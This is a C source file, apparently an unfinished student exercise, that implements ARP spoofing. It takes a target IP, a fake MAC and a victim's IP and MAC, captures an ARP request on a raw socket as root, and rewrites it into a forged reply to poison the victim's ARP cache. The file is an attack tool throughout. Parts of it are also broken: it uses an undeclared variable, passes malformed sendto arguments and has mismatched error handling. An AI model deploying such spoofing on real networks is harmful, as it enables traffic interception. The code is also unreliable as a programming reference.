#include "malcolm.h"

/*
◦ sendto - send data
◦ recvfrom - receive data

◦ socket - create a socket
◦ setsockopt - set socket options

◦ inet_pton - transform IPv4/IPv6 addresses to binary form
◦ inet_ntop - transform binary IP addresses to text form
◦ inet_addr - convert IPv4 addresses from text to binary form

◦ if_nametoindex - get interface index from name ??????
◦ sigaction - examine and change signal action
◦ signal - set a signal handler
◦ gethostbyname - get host information by name
◦ getaddrinfo, freeaddrinfo - get address information
◦ getifaddrs, freeifaddrs - get interface addresses
◦ htons, ntohs - convert port numbers between host and network byte order
◦ strerror / gai_strerror - get string representation of error codes

◦ getuid - get ID, check for root
◦ close - close a socket
◦ sleep - sleep

◦ printf and its family - printers
*/

int hex_check(char c)
{
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
};

int mac_to_byte(char *mac_str, uint8_t mac_bytes[ETH_ALEN]){

    int i = 0;
    int high_byte, low_byte;
    while(*mac_str && i < ETH_ALEN)
    {
        high_byte = hex_check(*mac_str++);
        if(high_byte < 0) return 1;
        low_byte = hex_check(*mac_str++);
        if(low_byte < 0) return 1;
        mac_bytes[i++] = (high_byte << 4) | low_byte;
        if(*mac_str == ':' || *mac_str == '-')
            mac_str++;
    }
    return (i == ETH_ALEN && *mac_str == '\0') ? 0 : 1;
}
int reply_prep(ether_hdr **fake_header, char **av)
{
    ether_hdr *r = malloc(sizeof(*r));
    if(!r)
        return 2;
    if (mac_to_byte(av[2], r->dest_addr) != 0)
        return (free(r),1);
    if (mac_to_byte(av[4], r->src_addr) != 0)
        return (free(r),1);
    r->frame_type = htons(ETH_P_ARP);
    *fake_header = r;
    return 0;
};
void error_printer(int check)
{
    if(check == 1)
        fprintf(stderr, "IP address not valid\n");
    if(check == 3)
        fprintf(stderr, "MAC address not valid\n");
    else
        fprintf(stderr, "reply malloc failed");
}
/*
    av[1] = target IP
    av[2] = fake MAC
    av[3] = victim IP
    av[4] = victim MAC  
*/
int main(int ac, char **av) 
{
    if(ac == 1)
    {
        fprintf(stderr, "Args needed\n");
        return 1;
    }
    if(getuid() != 0)
    {
        printf("Root privilage needed\n");
        return(1);
    }
    // reply_info *reply = NULL;
    ether_hdr *fake_header;
    int check = reply_prep(&fake_header, av); 
    if(check)
    {
        error_printer(check);
        return 1;
    }
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) 
    {
        fprintf(stderr, "socket");
        return 1;
    }
    uint8_t buf1[2048];
    // Add signal handler to close and exit on Ctrl+C
    // while(1)
    // {
    recvfrom(sock, buf1, sizeof(buf1), 0, NULL, NULL);
    printf("Packet received, size %zd\n", sizeof(buf1));
    size_t i = 14;
    arp_ether_ipv4 *arp = (arp_ether_ipv4 *)(buf1 + i);
    printf("OP: %hu\n\n", ntohs(arp->op));
    if (ntohs(arp->op) == 1) // ARP request
    {
        // printf("arp->op before :%hu" ,ntohs(arp->op));
        // arp->op = htons(2);
        // printf("arp->op after : %hu", ntohs(arp->op));
        printf("ARP Request:\n");
        printf("Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arp->sha[0], arp->sha[1], arp->sha[2], arp->sha[3], arp->sha[4], arp->sha[5]);
        char ip_buf[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &arp->spa, ip_buf, sizeof(ip_buf));
        printf("Sender IP: %s\n", ip_buf);
        // printf("Sender IP: %s\n", inet_ntoa(*(struct in_addr *)&arp->spa));
        printf("Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arp->tha[0], arp->tha[1], arp->tha[2], arp->tha[3], arp->tha[4], arp->tha[5]);
        inet_ntop(AF_INET, &arp->tpa, ip_buf, sizeof(ip_buf));
        printf("Target IP: %s\n", ip_buf);
    };
    // printf("Preparing to send ARP reply...\n");
    arp->op = htons(2);
    arp->tha[0] = reply->victim_MAC[0];
    arp->tha[1] = reply->victim_MAC[1];
    arp->tha[2] = reply->victim_MAC[2];
    arp->tha[3] = reply->victim_MAC[3];
    arp->tha[4] = reply->victim_MAC[4];
    arp->tha[5] = reply->victim_MAC[5];
    sendto(sock, arp, sizeof(arp_ether_ipv4) + sizeof(ether_hdr), 0, arp->tha[ETH_ALEN], sizeof(arp->tha[ETH_ALEN]));
    // if (ntohs(arp->op) == 2) // ARP request
    // {
    //     // printf("arp->op before :%hu" ,ntohs(arp->op));
    //     // arp->op = htons(2);
    //     // printf("arp->op after : %hu", ntohs(arp->op));
    //     printf("ARP modified Request:\n");
    //     printf("Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arp->sha[0], arp->sha[1], arp->sha[2], arp->sha[3], arp->sha[4], arp->sha[5]);
    //     printf("Sender IP: %s\n", inet_ntoa(*(struct in_addr *)&arp->spa));
    //     printf("Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arp->tha[0], arp->tha[1], arp->tha[2], arp->tha[3], arp->tha[4], arp->tha[5]);
    //     printf("Target IP: %s\n", inet_ntoa(*(struct in_addr *)&arp->tpa));
    // };
    //
    close(sock);
    // exit(0);
    // }
    return 0;
}